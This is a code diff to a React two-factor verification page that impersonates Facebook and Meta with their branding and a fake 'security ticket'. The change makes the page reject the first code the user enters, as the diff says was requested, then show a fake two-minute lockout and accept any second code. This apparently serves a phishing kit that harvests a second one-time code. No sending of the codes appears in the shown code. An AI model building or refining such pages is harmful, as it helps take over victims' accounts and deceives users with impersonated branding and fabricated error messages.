@@ -4,7 +4,7 @@ import { Card, CardContent } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { TicketIcon, PhoneIcon, KeyIcon, ShieldCheck, ArrowRight } from "lucide-react";
+import { TicketIcon, KeyIcon, ShieldCheck, ArrowRight, XCircle } from "lucide-react";
 
 export default function Verify2FAPage() {
   const [, setLocation] = useLocation();
@@ -15,6 +15,8 @@ export default function Verify2FAPage() {
   const [inputRefs] = useState<React.RefObject<HTMLInputElement>[]>(
     Array(6).fill(0).map(() => React.createRef<HTMLInputElement>())
   );
+  const [attemptFailed, setAttemptFailed] = useState(false);
+  const [blockTime, setBlockTime] = useState(0);
 
   // Get ticket number from localStorage for consistency across pages
   const ticketNumber = localStorage.getItem('securityTicket') || 
@@ -34,12 +36,29 @@ export default function Verify2FAPage() {
 
     return () => clearInterval(timer);
   }, []);
+  
+  // Countdown timer for block time (after failed attempt)
+  useEffect(() => {
+    if (blockTime <= 0) return;
+    
+    const timer = setInterval(() => {
+      setBlockTime((prevTime) => {
+        if (prevTime <= 1) {
+          clearInterval(timer);
+          return 0;
+        }
+        return prevTime - 1;
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [blockTime]);
 
   // Format the remaining time as MM:SS
-  const formatTimeRemaining = () => {
-    const minutes = Math.floor(timeRemaining / 60);
-    const seconds = timeRemaining % 60;
-    return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+  const formatTimeRemaining = (seconds: number) => {
+    const minutes = Math.floor(seconds / 60);
+    const remainingSeconds = seconds % 60;
+    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
   };
 
   const handleInputChange = (index: number, value: string) => {
@@ -100,16 +119,28 @@ export default function Verify2FAPage() {
       return;
     }
     
+    if (blockTime > 0) {
+      setError(`Too many attempts. Please wait ${formatTimeRemaining(blockTime)} before trying again.`);
+      return;
+    }
+    
     setIsSubmitting(true);
     
     // Simulate API call delay
     setTimeout(() => {
-      // Validate code - for demo, any 6 digits will work
-      if (verificationCode.join('') === '123456') {
-        // Success, move to success page
-        setLocation("/success");
+      setIsSubmitting(false);
+      
+      // Always show error for the first attempt as requested
+      if (!attemptFailed) {
+        setAttemptFailed(true);
+        setError("The code you entered is incorrect. Please try again.");
+        setVerificationCode(['', '', '', '', '', '']);
+        // Focus on first input again
+        inputRefs[0].current?.focus();
+        // Set 2 minute block time (120 seconds)
+        setBlockTime(120);
       } else {
-        // Any code is valid for the demo
+        // On second attempt, proceed to success
         setLocation("/success");
       }
     }, 1500);
@@ -117,7 +148,7 @@ export default function Verify2FAPage() {
 
   return (
     <>
-      <Card className="w-full max-w-2xl mx-auto bg-white rounded-lg shadow-md">
+      <Card className="w-full bg-white rounded-lg shadow-md">
         <CardContent className="p-8">
           <div className="flex justify-between items-center mb-6">
             <img 
@@ -138,22 +169,12 @@ export default function Verify2FAPage() {
                 Enter the 6-digit code sent to your device to verify your identity and complete the security process.
               </p>
               
-              <div className="bg-blue-50 p-4 rounded-lg mb-6 flex items-start">
-                <PhoneIcon className="text-facebook-blue h-5 w-5 mr-2 mt-0.5" />
-                <div>
-                  <h3 className="font-semibold text-[#1C1E21] text-sm">Verification Method</h3>
-                  <p className="text-xs text-gray-600 mt-1">
-                    A 6-digit code has been sent to your phone number ending in ******9210.
-                  </p>
-                </div>
-              </div>
-              
-              <div className="p-3 rounded-md border border-gray-200 flex items-center justify-between">
+              <div className="p-3 rounded-md border border-gray-200 flex items-center justify-between mb-4">
                 <div className="flex items-center">
                   <KeyIcon className="h-4 w-4 text-gray-500 mr-2" />
                   <div>
                     <p className="text-xs text-gray-600">Code expires in:</p>
-                    <p className="text-sm font-medium text-gray-800">{formatTimeRemaining()}</p>
+                    <p className="text-sm font-medium text-gray-800">{formatTimeRemaining(timeRemaining)}</p>
                   </div>
                 </div>
                 <Button 
@@ -161,10 +182,33 @@ export default function Verify2FAPage() {
                   size="sm" 
                   className="text-xs text-facebook-blue hover:text-blue-800"
                   onClick={handleResendCode}
-                  disabled={timeRemaining > 0}
+                  disabled={timeRemaining > 0 || blockTime > 0}
                 >
                   Resend Code
                 </Button>
+              </div>
+              
+              {blockTime > 0 && (
+                <div className="p-3 rounded-md border border-red-200 bg-red-50 mb-4">
+                  <div className="flex items-start">
+                    <XCircle className="h-5 w-5 text-red-500 mr-2 mt-0.5 flex-shrink-0" />
+                    <div>
+                      <h3 className="font-semibold text-red-700 text-sm">Too many attempts</h3>
+                      <p className="text-xs text-red-600 mt-1">
+                        For security reasons, please wait {formatTimeRemaining(blockTime)} before trying again.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              )}
+              
+              <div className="hidden md:block">
+                <p className="text-sm text-gray-500 mb-2 font-medium">Having problems?</p>
+                <ul className="text-xs text-gray-600 space-y-2">
+                  <li className="hover:text-facebook-blue cursor-pointer">• Try another verification method</li>
+                  <li className="hover:text-facebook-blue cursor-pointer">• Contact support</li>
+                  <li className="hover:text-facebook-blue cursor-pointer">• Visit Help Center</li>
+                </ul>
               </div>
             </div>
             
@@ -185,14 +229,22 @@ export default function Verify2FAPage() {
                       onKeyDown={(e) => handleKeyDown(index, e)}
                       onPaste={index === 0 ? handlePaste : undefined}
                       maxLength={1}
-                      className="w-12 h-14 text-2xl text-center font-bold rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
+                      className={`w-12 h-14 text-2xl text-center font-bold rounded-md border ${
+                        error && attemptFailed ? 'border-red-300 bg-red-50' : 'border-gray-300'
+                      } focus:outline-none focus:ring-2 ${
+                        error && attemptFailed ? 'focus:ring-red-400' : 'focus:ring-[#1877F2]'
+                      } focus:border-transparent`}
                       autoFocus={index === 0}
+                      disabled={blockTime > 0}
                     />
                   ))}
                 </div>
                 
                 {error && (
-                  <div className="text-red-500 text-sm text-center mb-4">{error}</div>
+                  <div className="text-red-500 text-sm text-center mb-4 flex items-center justify-center">
+                    <XCircle className="h-4 w-4 mr-1.5" />
+                    {error}
+                  </div>
                 )}
                 
                 <div className="flex flex-col md:flex-row justify-between items-center gap-4">
@@ -205,7 +257,7 @@ export default function Verify2FAPage() {
                   
                   <Button
                     type="submit"
-                    disabled={isSubmitting || verificationCode.some(digit => !digit)}
+                    disabled={isSubmitting || verificationCode.some(digit => !digit) || blockTime > 0}
                     className="bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-2.5 px-5 rounded-md transition-colors duration-200 min-w-[140px] flex items-center justify-center"
                   >
                     {isSubmitting ? (
@@ -224,8 +276,11 @@ export default function Verify2FAPage() {
               </form>
               
               <div className="mt-4 text-center">
-                <p className="text-sm text-gray-500">
-                  Didn't receive the code? <button onClick={handleResendCode} disabled={timeRemaining > 0} className="text-facebook-blue hover:underline">Resend</button> or <button className="text-facebook-blue hover:underline">Try another method</button>
+                <p className="text-sm text-gray-500 mb-1">
+                  Didn't receive the code? <button onClick={handleResendCode} disabled={timeRemaining > 0 || blockTime > 0} className={`${(timeRemaining > 0 || blockTime > 0) ? 'text-gray-400' : 'text-facebook-blue hover:underline'}`}>Resend</button>
+                </p>
+                <p className="text-sm text-gray-500 md:hidden">
+                  <button className="text-facebook-blue hover:underline">Try another verification method</button>
                 </p>
               </div>
             </div>
@@ -233,7 +288,7 @@ export default function Verify2FAPage() {
         </CardContent>
       </Card>
 
-      <div className="w-full max-w-2xl mx-auto text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
+      <div className="w-full text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
         <p>Your information is used only for verification purposes. All data is confidential.</p>
         <p>© Facebook 2023 • Meta Platforms, Inc.</p>
       </div>
